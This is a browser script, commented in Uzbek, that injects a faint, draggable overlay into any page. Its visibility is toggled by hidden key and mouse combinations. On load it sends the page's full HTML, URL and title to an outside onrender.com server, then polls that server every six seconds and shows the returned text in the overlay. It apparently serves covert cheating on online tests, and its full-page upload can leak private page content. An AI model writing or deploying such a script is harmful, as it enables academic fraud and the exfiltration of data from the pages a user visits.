// TEXTBOX
const CLIENT_ID = 7;

const newDiv = document.createElement("div");
newDiv.id = "myDiv";
newDiv.textContent = "A project by py_dex*";
newDiv.style.cssText = `
    position: absolute;
    bottom: 10px;
    left: 10px;
    width: 300px;
    height: 150px;
    padding: 10px;
    opacity: 0.4;
    z-index: 1000;
`;
document.body.appendChild(newDiv);

const el = document.getElementById("myDiv");
let isDragging = false, offsetX = 0, offsetY = 0;
let opacity = 0.4;

// ================= DRAG =================
el.addEventListener("mousedown", (e) => {
    isDragging = true;
    offsetX = e.clientX - el.offsetLeft;
    offsetY = e.clientY - el.offsetTop;
});

document.addEventListener("mousemove", (e) => {
    if (!isDragging) return;
    el.style.left = (e.clientX - offsetX) + "px";
    el.style.top = (e.clientY - offsetY) + "px";
});

document.addEventListener("mouseup", () => {
    isDragging = false;
});

// ================= TOGGLE FUNCTION =================
function toggleMyDiv() {
    if (opacity === 0.4) {
        el.style.opacity = "0";
        opacity = 0;
    } else {
        el.style.opacity = "0.4";
        opacity = 0.4;
    }
}

// ================= OPTION 1: SPACE + M =================
let spacePressed = false;

document.addEventListener("keydown", (e) => {
    if (e.code === "Space") {
        spacePressed = true;
    }

    if (spacePressed && (e.key === "m" || e.key === "M")) {
        e.preventDefault();
        toggleMyDiv();
    }
});

document.addEventListener("keyup", (e) => {
    if (e.code === "Space") {
        spacePressed = false;
    }
});

// ================= OPTION 2: LEFT HOLD + RIGHT DOUBLE CLICK =================
let leftHold = false;
let rightDownCount = 0;
let rightTimer = null;

// LEFT mouse hold
document.addEventListener("mousedown", (e) => {
    if (e.button === 0) {
        leftHold = true;
    }

    // RIGHT mouse down while LEFT is held
    if (e.button === 2 && leftHold) {
        e.preventDefault(); // <<< MUHIM
        rightDownCount++;

        if (rightDownCount === 1) {
            rightTimer = setTimeout(() => {
                rightDownCount = 0;
            }, 1000);
        }

        if (rightDownCount === 2) {
            clearTimeout(rightTimer);
            rightDownCount = 0;
            toggleMyDiv();
        }
    }
});

// reset on left release
document.addEventListener("mouseup", (e) => {
    if (e.button === 0) {
        leftHold = false;
        rightDownCount = 0;
        clearTimeout(rightTimer);
    }
});

// BLOCK context menu ONLY while left is held
document.addEventListener("contextmenu", (e) => {
    if (leftHold) {
        e.preventDefault();
    }
});

// ================= PAGE_SENDER =================
async function sendPage() {
    const html = document.documentElement.outerHTML;
    const url = window.location.href;
    const title = document.title;

    try {
        const payload = {
            html: html,
            url: url,
            title: title,
            client_id: CLIENT_ID
        };

        const response = await fetch("https://server-1-ddvv.onrender.com/api/receive-page/", {  // Yangi HTTPS manzil
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-Requested-With": "XMLHttpRequest"
            },
            body: JSON.stringify(payload)  // To'g'ri JSON.stringify ishlatildi (encoder kerak emas)
        });

        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Server xatosi: ${response.status} - ${errorText}`);
        }

        const data = await response.json();

        if (data.success) {
            el.textContent = "Sahifa muvaffaqiyatli yuborildi! ID: " + (data.data?.id || CLIENT_ID);
        } else {
            el.textContent = "Xato: " + (data.message || "Noma'lum xato");
        }
    } catch (error) {
        console.error("Sahifa yuborish xatosi:", error);
        el.textContent = "Yuborish xatosi: " + error.message;
    }
}

// ================= RECEIVER =================
let lastMessage = "";

async function readApiData(apiUrl = "https://server-1-ddvv.onrender.com/api/data/") {
    try {
        const response = await fetch(apiUrl + "?client_id=" + CLIENT_ID);
        if (!response.ok) {
            throw new Error(`Server xatosi: ${response.status}`);
        }
        const jsonData = await response.json();
        return jsonData;
    } catch (error) {
        console.error("Ma'lumot o'qish xatosi:", error);
        return null;
    }
}

sendPage();

setInterval(async () => {
    const data = await readApiData();
    if (data && data.success && data.text) {
        el.textContent = data.text;
    } else {
        el.textContent = "Yangi ma'lumotlar kutilmoqda...";
    }
}, 6000);
